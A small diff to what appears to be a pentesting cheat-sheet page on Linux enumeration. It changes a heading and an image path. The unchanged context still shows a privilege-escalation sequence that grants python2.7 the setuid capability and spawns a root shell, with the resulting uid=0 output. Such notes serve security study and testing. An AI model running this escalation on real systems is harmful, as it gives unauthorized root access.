@@ -4,7 +4,7 @@ description: >-
   sources and combined together with a little modification.
 ---
 
-# Enumeration
+# ⭕ Enumeration
 
 ## <mark style="color:red;">system information</mark>
 
@@ -390,4 +390,4 @@ Capabilities\\
 
 #### `sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7` `python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'` `sh-5.0# id` `uid=0(root) gid=1000(swissky)` `>`
 
-![](../../../.gitbook/assets/capabilities1.png)
+![](../../.gitbook/assets/capabilities1.png)
